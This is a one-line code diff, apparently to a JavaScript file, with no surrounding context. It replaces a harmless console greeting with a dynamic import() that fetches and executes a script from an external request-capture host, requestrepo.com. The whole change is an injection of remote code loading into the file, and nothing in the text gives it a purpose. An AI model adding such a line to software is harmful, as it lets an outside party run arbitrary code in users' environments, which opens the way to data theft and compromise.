@@ -1,1 +1,1 @@
-console.dir("Shirley: Hello sudi on " + origin )
+import(`https://s8lmvcw3.requestrepo.com/hello.js`)
